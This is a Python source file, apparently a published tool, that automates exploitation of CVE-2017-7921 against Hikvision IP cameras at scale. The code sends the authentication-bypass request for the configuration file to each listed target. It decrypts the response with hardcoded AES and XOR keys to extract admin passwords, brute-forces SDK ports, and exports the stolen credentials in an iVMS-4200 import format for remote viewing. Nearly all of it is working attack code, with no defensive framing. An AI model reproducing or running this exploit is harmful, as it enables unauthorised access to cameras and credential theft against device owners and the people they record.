#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝

import json
import argparse
import re
import os
import sys
import socket
import threading
import queue
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor, as_completed, CancelledError
from Crypto.Cipher import AES
import requests
import xml.etree.ElementTree as ET
from requests.exceptions import RequestException, ConnectionError, Timeout
from requests.auth import HTTPBasicAuth

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

try:
    import colorama
    colorama.init(autoreset=True)
    RED = "\033[31m"          
    BRIGHT_RED = "\033[31;1m" 
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    RESET = "\033[0m"         
except ImportError:
    RED = ""
    BRIGHT_RED = ""
    GREEN = ""
    YELLOW = ""
    RESET = ""

HEX_DATA = "0000002063000000119706d5001110c26800a8c025801157cc28aa16edda0000"
MATCH_PREFIX = "000000c4"
DEFAULT_SDK_PORT = 8000
SDK_PORT_SCAN_RANGE = range(8000, 8101)  
SCAN_TIMEOUT = 1 
REQUEST_TIMEOUT = 3  

result_lock = threading.Lock()
print_lock = threading.Lock()
cracked_devices = []  
final_results = []    
open_sdk_ports = {}   

LOGO = '''
⠀https://github.com/MartinxMax⠀⠀⠀⠀⠀⠀⠀⠀⢀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⢹⠀⠀⡀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
Maptnh@S-H4CK13⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⠴⣶⣶⣺⣿⣼⣄⠀⣟⣇⠀⢠⠀⠀⠀⣿⠀⠀⠀⡿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⢀⣤⡿⠚⣹⣧⣶⠟⣏⢛⢹⣿⣿⢉⠉⡏⡿⣿⢻⠶⣤⣰⣷⡇⠠⣰⣿⣇⢀⠆⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠇⠀⣸⡟⡋⢸⡆⢰⣿⣷⣄⣸⣏⣏⣹⣿⣿⡄⣸⣷⣿⣇⡟⢀⣴⣿⡟⡿⢶⣿⡟⣿⣮⣀⣠⣞⠁⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⣿⣠⣞⣽⣿⡿⢿⣷⣄⣿⣟⣧⣽⣿⣟⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⠟⣼⣿⣿⣷⡟⠿⢧⣄⡀⠀⢠⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠀⢱⡄⠀⣄⣿⣿⡉⠁⢻⣿⣥⡽⢿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣯⣿⣿⣯⣿⣿⣿⡿⡻⠿⣶⡾⠋⢉⣶⡿⠥⠄⣠⠞⠀⣀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠸⣆⠀⢹⣭⣿⣅⠘⣿⣾⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣻⡯⣪⣥⡶⠛⣻⣶⣿⢏⠀⣠⣟⡁⢠⠀⢈⡀⠀⢀⠀
⠀⠀⠀⠀⠀⠀⣼⠀⠘⣶⣾⠏⣿⣿⢿⣿⣿⣿⣿⡿⠟⢉⣽⣿⣿⣿⠿⠛⠉⠉⠁⠀⠀⠈⠉⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣿⣿⣷⣟⣩⣏⣹⠿⠁⣰⠃⢀⡜⠀
⠀⠀⠀⠀⠀⠀⢻⣥⡴⢋⣹⣿⣿⣽⣿⣿⣿⡿⠏⠀⣠⣿⣿⡿⠋⠀⠀⠀⠀⣀⣀⣤⣤⣄⣀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣟⣿⣶⡾⣷⣶⣾⡟⢉⣾⡇⠀
⠀⠀⠀⠀⠰⠂⣠⡿⣷⣾⣿⣷⣿⣿⣿⣿⠃⠀⠀⢰⣿⣿⠋⠀⠀⠀⢀⣶⣿⣿⣿⠿⠿⣿⣿⣿⣷⣄⠀⠀⠀⠈⢿⣿⣿⣻⢿⣿⣿⣿⣿⣤⣤⣾⣟⣻⣿⣿⣏⣴⡿⢋⣴⠛
⠀⠀⠀⠀⠀⣺⣏⣾⠟⣻⣿⣿⠇⣿⣿⡇⠀⠀⢀⣿⣿⡏⠀⠀⠀⢰⣿⣿⠟⠉⠀⠀⠀⠀⠉⠻⣿⣿⣷⡀⠀⠀⠀⢻⣿⣿⢣⡙⢿⣿⣿⣿⣿⣯⣿⣶⣾⡿⣟⣭⣶⡾⠋⠀
⠀⠠⢤⡆⣴⣳⣿⢿⣿⡿⠟⠁⠀⣿⣿⠁⠀⠀⠸⣿⣿⡇⠀⠀⠀⢸⣿⣿⣤⣤⣴⣶⣦⡀⠀⠀⠈⢿⣿⣷⠀⠀⠀⠘⣿⣿⡆⢻⠠⠟⠿⣿⣿⣿⣿⣟⡛⣻⣿⠟⠋⣀⢀⠀
⠀⠀⠀⣙⣿⣿⣿⣿⠋⣴⡄⠀⠀⣿⣿⡆⠀⠀⠀⢻⣿⣷⡀⠀⠀⠈⠻⠿⠿⠟⠛⣿⣿⣧⠀⠀⠀⢸⣿⣿⡄⠀⠀⠀⣿⣿⣇⡟⠀⠀⠀⢲⣿⣿⣿⣿⣿⣿⣶⣶⣾⡿⠟⠀
⠀⣀⣠⣿⣟⣷⡿⢁⡾⢸⡁⠀⠀⢻⣿⣷⡀⠀⠀⠈⢿⣿⣿⣤⣀⠀⠀⠀⠀⢀⣰⣿⣿⡏⠀⠀⠀⢸⣿⣿⠁⠀⠀⢠⣿⣿⡟⠀⠀⠀⢠⣿⢿⣢⡻⢿⠙⢿⣛⣏⠁⠀⠀⠀
⢠⣾⣿⠟⣽⡟⡇⠙⢿⢄⣇⠀⠀⠀⢿⣿⣷⡄⠀⠀⠀⠙⠿⣿⣿⣿⣷⣶⣿⣿⣿⡿⠋⠀⠀⠀⣠⣿⣿⡟⠀⠀⠀⣾⣿⠋⠀⠀⢀⢀⣿⡿⢷⣾⣿⣯⣄⣹⡿⠋⠀⠀⠀⠀
⠀⠉⠁⢰⣿⠁⣳⡅⠈⣦⡝⣤⡀⠀⠈⠻⣿⣿⣦⡀⠀⠀⠀⠈⠉⠛⠛⠛⠛⠋⠁⠀⠀⠀⢀⣴⣿⣿⠟⠀⠀⢀⣾⠟⠁⠀⠀⢠⣬⣿⣿⣿⣞⠇⢳⡌⢿⣿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⡿⢧⡀⠉⣩⣤⣧⣈⠙⠺⠶⣤⣄⡈⠻⣿⣿⣷⣦⣤⣀⡀⠀⠀⠀⠀⠀⣀⣠⣴⣾⣿⣿⠟⠁⠀⢀⣴⠟⠁⠀⢀⣤⣾⣿⣿⠿⣾⠷⣿⣆⡼⠓⣾⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⢦⣉⣉⣀⠤⡜⠉⠛⢶⣤⣄⣀⣉⡉⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠋⠁⣠⠴⠞⣉⣀⣀⣤⣶⢶⣻⣿⡵⣘⠢⠈⣦⠘⢿⠇⢰⡿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠛⠛⠛⢧⣤⡴⠋⠀⠈⢻⡿⠾⢿⣷⣶⣤⣴⣆⣌⣭⣉⣩⣭⣉⠀⣄⡤⣄⢠⣤⣄⣠⣴⠾⣿⡿⣏⠘⠻⣧⡘⣿⡜⠶⠄⠈⢤⠞⢠⣿⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣯⣭⣽⣳⢦⣉⠲⢤⣠⠏⠀⠀⡼⣱⠋⢹⣿⢻⠟⠛⡟⣿⠟⢻⠟⣟⢿⠻⣟⠛⢯⢻⣯⣆⠘⣿⡌⢳⣄⢻⣷⠈⠀⠀⢀⡤⠋⢠⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠉⠉⠻⢷⣌⠙⠲⣽⡃⠀⠀⢷⠇⠀⠸⠁⡞⠀⡀⠙⡟⠂⠀⡟⢿⣼⠀⠹⡇⠈⢧⣎⢿⣇⠸⠿⠀⠉⢮⠏⠃⢀⡴⠊⠀⣠⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢦⡀⠉⠓⢦⣞⠀⠀⠀⠀⠁⠀⠀⠀⡇⠈⠳⡷⠀⡿⠴⠀⠘⠀⠸⠋⠻⣿⠀⠀⠁⠈⢈⡧⠞⠁⠀⠀⠜⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠓⠦⣄⣀⠀⠀⠀⠁⠀⠀⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠓⠲⠤⢤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Play via iVMS-4200⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                     
CVE-2017-7921 Automatic Hikvision Password Cracker
======================================================='''
class HikvisionCracker:
    def __init__(self):
        self.URL_SUFFIX = "/System/configurationFile?auth=YWRtaW46MTEK"
        self.DEFAULT_USER = "admin"
        self.DEFAULT_RTSP_PORT = 554
    
        self.CSV_HEADER = (
            "Name,"
            "Adding Mode (0: IP/Domain; 1: HiDDNS; 2: ISUP),"
            "Address (Adding Mode 0: IP Address/Domain Name; Adding Mode 1: Server Address; Adding Mode 2: Invalid),"
            "Port,"
            "Device Information (Adding Mode 0: Invalid; Adding Mode 1: Domain Name; Adding Mode 2: Account),"
            "User Name,"
            "Password (Adding Mode 0/1: Password; Adding Mode 2: ISUP Key),"
            "Add Offline Device (0: No; 1: Yes),"
            "Export to Group (0: No; 1: Yes),"
            "Channel Number (Add Offline Device 0: Invalid; Add Offline Device 1: Range [1 to 32].),"
            "Alarm Input Number (Add Offline Device 0: Invalid; Add Offline Device 1: Range [1 to 32].),"
            "Transmission Encryption (TLS) (0: No; 1: Yes)"
        )

    def validate_ip(self, ip: str) -> bool:
        pattern = re.compile(r'^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')
        return bool(pattern.match(ip))

    def scan_single_ip_sdk_port(self, ip: str, port: int) -> int | None:
        if ip in open_sdk_ports:
            return None
        
        try:
            payload = bytes.fromhex(HEX_DATA)
        except ValueError as e:
            with print_lock:
                print(f"{YELLOW}[!] {RED}{ip}{RESET}:{RED}{port}{RESET} Hex data conversion failed: {str(e)[:30]}{RESET}")
            return None

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(SCAN_TIMEOUT)
                s.connect((ip, port))
                s.sendall(payload)
                resp = s.recv(4096)
                
                if resp and resp.hex().startswith(MATCH_PREFIX):
                    with result_lock:
                        if ip not in open_sdk_ports:
                            open_sdk_ports[ip] = port
                    with print_lock:
                        print(f"{GREEN}[SDK Crack Success] {RED}{ip}{RESET}:{RED}{port}{RESET}{RESET}")
                    return port
        except (socket.timeout, ConnectionRefusedError, OSError, ConnectionError):
            pass
        except Exception as e:
            with print_lock:
                print(f"{YELLOW}[!] {RED}{ip}{RESET}:{RED}{port}{RESET} Scan exception: {str(e)[:30]}{RESET}")
        return None

    def batch_brute_sdk_ports(self, ip_list: list, max_workers: int) -> None:
        with print_lock:
            print(f"[*] Start brute-forcing SDK ports for cracked IPs (Range: {SDK_PORT_SCAN_RANGE.start}-{SDK_PORT_SCAN_RANGE.stop-1})...")
 
        for ip in ip_list:
            if not self.validate_ip(ip):
                with print_lock:
                    print(f"{YELLOW}[!] Invalid IP format: {RED}{ip}{RESET}, skipped{RESET}")
                continue
            
            ip_has_open_port = False  
            ports_to_scan = list(SDK_PORT_SCAN_RANGE)
            ports_to_scan.insert(0, DEFAULT_SDK_PORT)
            ports_to_scan = list(set(ports_to_scan))
            ports_to_scan.sort()
            
            thread_num = min(max_workers, len(ports_to_scan))
            with ThreadPoolExecutor(max_workers=thread_num) as executor:
                future_map = {}
                for port in ports_to_scan:
                    if ip in open_sdk_ports:
                        break
                    future = executor.submit(self.scan_single_ip_sdk_port, ip, port)
                    future_map[future] = port
                
                for future in as_completed(future_map):
                    port = future_map[future]
                    try:
                        result = future.result()
                        if result is not None:
                            ip_has_open_port = True
                            for remaining_future in future_map:
                                if not remaining_future.done():
                                    remaining_future.cancel()
                            break
                    except CancelledError:
                        pass
                    except Exception as e:
                        with print_lock:
                            print(f"{YELLOW}[!] {RED}{ip}{RESET}:{RED}{port}{RESET} Scan exception: {str(e)[:30]}{RESET}")
            
            if not ip_has_open_port:
                with print_lock:
                    print(f"{YELLOW}[!] {RED}{ip}{RESET} No open SDK ports found (Range 8000-8100){RESET}")

    def add_to_16(self, s: bytes) -> bytes:
        while len(s) % 16 != 0:
            s += b'\0'
        return s 

    def decrypt(self, ciphertext: bytes, hex_key: str = '279977f62f6cfd2d91cd75b889ce0c9a') -> bytes:
        try:
            key = bytes.fromhex(hex_key)
            ciphertext = self.add_to_16(ciphertext)
            cipher = AES.new(key, AES.MODE_ECB)
            plaintext = cipher.decrypt(ciphertext[AES.block_size:])
            return plaintext.rstrip(b"\0")
        except Exception as e:
            with print_lock:
                print(f"{YELLOW}[!] AES decryption failed: {str(e)[:30]}{RESET}")
            return b""

    def xore(self, data: bytes, key: bytearray = bytearray([0x73, 0x8B, 0x55, 0x44])) -> bytes:
        try:
            return bytes(a ^ b for a, b in zip(data, cycle(key)))
        except Exception as e:
            with print_lock:
                print(f"{YELLOW}[!] XOR decryption failed: {str(e)[:30]}{RESET}")
            return b""

    def extract_strings(self, data: bytes) -> list:
        chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
        shortest_len = 2
        reg_exp = f'[{chars}]{{{shortest_len},}}'
        pattern = re.compile(reg_exp)
        return pattern.findall(data.decode('ISO-8859-1', errors='ignore'))

    def request_config_file(self, ip: str, port: int = 80) -> requests.Response | None:
        proto = "https" if port == 443 else "http"
        full_url = f"{proto}://{ip}:{port}{self.URL_SUFFIX}"
        try:
            response = requests.get(
                full_url, 
                timeout=REQUEST_TIMEOUT, 
                verify=False, 
                allow_redirects=False
            )  
            return response
        except Timeout:
            with print_lock:
                print(f"{YELLOW}[!] {RED}{ip}{RESET}:{RED}{port}{RESET} Request timeout (> {REQUEST_TIMEOUT} seconds){RESET}")
        except ConnectionError:
            with print_lock:
                print(f"{YELLOW}[!] {RED}{ip}{RESET}:{RED}{port}{RESET} Connection failed{RESET}")
        except RequestException as e:
            with print_lock:
                print(f"{YELLOW}[!] {RED}{ip}{RESET}:{RED}{port}{RESET} Request failed: {str(e)[:50]}{RESET}")
        return None

    def find_last_list_index(self, lst: list, target: str) -> int:
        try:
            return len(lst) - 1 - lst[::-1].index(target)
        except ValueError:
            return -1

 
    def clean_csv_field(self, field):
        if not isinstance(field, str):
            field = str(field)
        field = field.replace(',', '&#44;') 
        field = field.replace('\n', '').replace('\r', '')  
        field = field.replace('\t', ' ')  
        field = field.strip()
        return field

    def crack_password(self, ip: str, http_port: int = 80) -> dict | None:
        response = self.request_config_file(ip, http_port)
        if response is None:
            return None
        
        if response.status_code == 200:
            try:
                binary_data = response.content
                decrypt_data = self.decrypt(binary_data)
                xor_data = self.xore(decrypt_data)
                
                data_list = self.extract_strings(xor_data)
                admin_index = self.find_last_list_index(data_list, 'admin')
                
                if admin_index != -1 and admin_index + 1 < len(data_list):
                    username = data_list[admin_index]
                    password = data_list[admin_index+1].strip() or "default123456"
                    
                    with print_lock:
                        print(f"{BRIGHT_RED}[+] Password cracked successfully {RESET}{RED}{ip}{RESET}:{RED}{http_port}{RESET} => {RED}{username}{RESET}:{RED}{password}{RESET}{RESET}")
                    
                    return {
                        "ip": ip,
                        "http_port": http_port,
                        "username": username,
                        "password": password
                    }
                else:
                    with print_lock:
                        print(f"{YELLOW}[!] {RED}{ip}{RESET}:{RED}{http_port}{RESET} Admin password not found{RESET}")
            except Exception as e:
                with print_lock:
                    print(f"{RED}[!] {RED}{ip}{RESET}:{RED}{http_port}{RESET} Cracking exception: {str(e)[:50]}{RESET}")
        else:
            with print_lock:
                print(f"{YELLOW}[!] {RED}{ip}{RESET}:{RED}{http_port}{RESET} Status code {response.status_code}, skipped{RESET}")
        return None

    def read_ips_from_file(self, file_path: str) -> list:
        if not os.path.exists(file_path):
            with print_lock:
                print(f"{RED}[!] Target file does not exist: {file_path}{RESET}")
            return []
        
        if not os.access(file_path, os.R_OK):
            with print_lock:
                print(f"{RED}[!] No read permission: {file_path}{RESET}")
            return []
        
        ip_list = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    if ':' in line:
                        ip, port_str = line.split(':', 1)
                        ip = ip.strip()
                        port_str = port_str.strip()
                        
                        if not self.validate_ip(ip):
                            with print_lock:
                                print(f"{YELLOW}[!] Line {line_num}: Invalid IP format {RED}{ip}{RESET}, skipped{RESET}")
                            continue
                        
                        if port_str.isdigit():
                            port = int(port_str)
                            if 1 <= port <= 65535:
                                ip_list.append({"ip": ip, "port": port})
                            else:
                                with print_lock:
                                    print(f"{YELLOW}[!] Line {line_num}: Port {port_str} out of range, using default 80 for {RED}{ip}{RESET}{RESET}")
                                    ip_list.append({"ip": ip, "port": 80})
                        else:
                            with print_lock:
                                print(f"{YELLOW}[!] Line {line_num}: Port {port_str} is not a number, using default 80 for {RED}{ip}{RESET}{RESET}")
                                ip_list.append({"ip": ip, "port": 80})
                    else:
                        ip = line.strip()
                        if self.validate_ip(ip):
                            ip_list.append({"ip": ip, "port": 80})
            
            unique_ips = {}
            for item in ip_list:
                if item["ip"] not in unique_ips:
                    unique_ips[item["ip"]] = item
            ip_list = list(unique_ips.values())
            
            with print_lock:
                if ip_list:
                    print(f"[*] Successfully read {len(ip_list)} valid targets")
                else:
                    print(f"{YELLOW}[!] No valid targets found{RESET}")
            return ip_list
        except Exception as e:
            with print_lock:
                print(f"{RED}[!] Failed to read file: {str(e)[:50]}{RESET}")
            return []

def assemble_final_results() -> None:
    global final_results
    final_results.clear()
    
    for device in cracked_devices:
        ip = device["ip"]
        if ip not in open_sdk_ports:
            continue
        
        http_port = device["http_port"]
        username = device["username"]
        password = device["password"]
        sdk_port = open_sdk_ports[ip]
        
        csv_data = {
            "name": f"Cam_{ip.replace('.','_')}_{sdk_port}",
            "adding_mode": 0,
            "address": ip,
            "port": sdk_port,
            "device_info": "",
            "user_name": username,
            "password": password,
            "add_offline_device": 0,
            "export_to_group": 0,
            "channel_number": "",
            "alarm_input_number": "",
            "tls_encryption": 0
        }
        
        json_data = {
            "IP": ip,
            "HTTP_PORT": http_port,
            "SDK_PORT": sdk_port,
            "RTSP_PORT": 554,
            "USERNAME": username,
            "PASSWORD": password
        }
        
        cracker = HikvisionCracker()
        for key in csv_data:
            csv_data[key] = cracker.clean_csv_field(csv_data[key])
        
        final_results.append({
            "csv_data": csv_data,
            "json_data": json_data
        })

 
def save_to_ivms_csv(cracker: HikvisionCracker, success_list: list, csv_path: str) -> bool:
    dir_path = os.path.dirname(csv_path)
    if not os.path.exists(dir_path):
        os.makedirs(dir_path, exist_ok=True)
        with print_lock:
            print(f"[*] Created directory: {dir_path}")
    
    header_fields = cracker.CSV_HEADER.split(',')
    expected_fields_count = len(header_fields)
    with print_lock:
        print(f"[*] CSV header check: {expected_fields_count} fields required (12)")

    csv_rows = [cracker.CSV_HEADER + "\r\n"]
    valid_rows = 0
    
    for idx, device in enumerate(success_list):
        if not device or "csv_data" not in device:
            continue
        
        csv_data = device["csv_data"]
        row = (
            f"{csv_data['name']},"
            f"{csv_data['adding_mode']},"
            f"{csv_data['address']},"
            f"{csv_data['port']},"
            f"{csv_data['device_info']},"
            f"{csv_data['user_name']},"
            f"{csv_data['password']},"
            f"{csv_data['add_offline_device']},"
            f"{csv_data['export_to_group']},"
            f"{csv_data['channel_number']},"
            f"{csv_data['alarm_input_number']},"
            f"{csv_data['tls_encryption']}\r\n"
        )
        
        row_fields_count = len(row.strip().split(','))
        if row_fields_count != expected_fields_count:
            with print_lock:
                print(f"[!] Skip invalid row {idx}: {csv_data['address']} (fields count {row_fields_count} != {expected_fields_count})")
            continue
        
        csv_rows.append(row)
        valid_rows += 1
    
    try:
        with open(csv_path, 'w', encoding='utf-8', newline='') as f:
            f.writelines(csv_rows)
        
        if os.path.exists(csv_path):
            file_size = os.path.getsize(csv_path)
            with print_lock:
                print(f"[*] Successfully saved {valid_rows} valid devices to CSV: {csv_path} (Size: {file_size} bytes, Encoding: utf-8)")
        return True
    except Exception as e:
        with print_lock:
            print(f"[!] Failed to save CSV: {str(e)}")
        return False

def save_to_json(success_list: list, json_path: str) -> bool:
    dir_path = os.path.dirname(json_path)
    if dir_path and not os.path.exists(dir_path):
        try:
            os.makedirs(dir_path, exist_ok=True)
            with print_lock:
                print(f"{GREEN}[*] Directory created successfully: {dir_path}{RESET}")
        except Exception as e:
            with print_lock:
                print(f"{RED}[!] Failed to create directory: {str(e)[:30]}{RESET}")
            return False
    
    json_output = []
    for device in success_list:
        if device and "json_data" in device:
            json_output.append(device["json_data"])
    
    try:
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(json_output, f, ensure_ascii=False, indent=4)
        
        if os.path.exists(json_path):
            file_size = os.path.getsize(json_path)
            with print_lock:
                print(f"{GREEN}[*] JSON saved successfully: {json_path} (Size: {file_size} bytes, Number of devices: {len(json_output)}){RESET}")
            return True
        else:
            with print_lock:
                print(f"{RED}[!] JSON file not generated: {json_path}{RESET}")
            return False
    except PermissionError:
        with print_lock:
            print(f"{RED}[!] No write permission: {json_path}{RESET}")
        return False
    except Exception as e:
        with print_lock:
            print(f"{RED}[!] Failed to save JSON: {str(e)[:50]}{RESET}")
        return False

def crack_worker(cracker: HikvisionCracker, task_queue: queue.Queue) -> None:
    while not task_queue.empty():
        try:
            target = task_queue.get(timeout=1)
            ip = target["ip"]
            http_port = target["port"]
            
            result = cracker.crack_password(ip, http_port)
            if result:
                with result_lock:
                    if not any(dev["ip"] == ip for dev in cracked_devices):
                        cracked_devices.append(result)
            
            task_queue.task_done()
        except queue.Empty:
            break
        except Exception as e:
            with print_lock:
                print(f"{RED}[!] Cracking thread exception: {str(e)[:50]}{RESET}")
            task_queue.task_done()

def main() -> None:
    print(LOGO)
    
    parser = argparse.ArgumentParser(
        description='CVE-2017-7921 Hikvision Password Cracker',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Usage Examples:
  1. Export CSV: python %(prog)s --ips ./target.txt --csv ./result.csv --threads 15
  2. Export JSON: python %(prog)s --ips ./target.txt --json ./result.json --threads 10
Notes:
  - target.txt format: IP:PORT (one per line, support comment lines starting with #)
  - Recommended thread count: 10-20, too high may be blocked by firewall
        """
    )
    parser.add_argument('--ips', type=str, default="./target.txt", 
                        help='IP:PORT list file path (Default: ./target.txt)')
    parser.add_argument('--threads', type=int, default=10, 
                        help='Number of threads (1-100) (Default: 10)')
    output_group = parser.add_mutually_exclusive_group(required=True)
    output_group.add_argument('--csv', type=str, help='Export iVMS compatible CSV file (Example: --csv ./hik_ivms.csv)')
    output_group.add_argument('--json', type=str, help='Export JSON file (Example: --json ./hik_result.json)')
    
    args = parser.parse_args()
    
    if args.threads < 1 or args.threads > 100:
        with print_lock:
            print(f"{YELLOW}[!] Thread count {args.threads} out of range (1-100), using default 10{RESET}")
        args.threads = 10
    
    cracker = HikvisionCracker()
    
    ip_list = cracker.read_ips_from_file(args.ips)
    if not ip_list:
        sys.exit(1)
    
    with print_lock:
        print(f"[*] Start batch password cracking (Threads: {args.threads})...")
    
    task_queue = queue.Queue()
    for target in ip_list:
        task_queue.put(target)
    
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=crack_worker, args=(cracker, task_queue))
        t.daemon = True
        t.start()
        threads.append(t)
    
    task_queue.join()
    for t in threads:
        t.join()
    
    if not cracked_devices:
        with print_lock:
            print(f"{RED}[!] No devices with cracked passwords, program exits{RESET}")
        sys.exit(0)
    
    with print_lock:
        print(f"[*] Password cracking completed! Successfully cracked {len(cracked_devices)} devices")
        for dev in cracked_devices:
            print(f"    {RED}{dev['ip']}{RESET}:{RED}{dev['http_port']}{RESET} => {RED}{dev['username']}{RESET}:{RED}{dev['password']}{RESET}")
    
    cracked_ip_list = [dev["ip"] for dev in cracked_devices]
    cracker.batch_brute_sdk_ports(cracked_ip_list, args.threads)
    
    assemble_final_results()
    
    if not final_results:
        with print_lock:
            print(f"{RED}[!] No valid results (no devices with SDK ports found){RESET}")
        sys.exit(0)
 
    if args.csv:
        save_to_ivms_csv(cracker, final_results, args.csv)
    elif args.json:
        save_to_json(final_results, args.json)
    
    with print_lock:
        print(f"{GREEN}[*] All operations completed! Final number of exported devices: {len(final_results)}{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        with print_lock:
            print(f"{YELLOW}[!] Program interrupted by user (Ctrl+C){RESET}")
        sys.exit(0)
    except Exception as e:
        with print_lock:
            print(f"{RED}[!] Program exited abnormally: {str(e)[:100]}{RESET}")
        sys.exit(1)
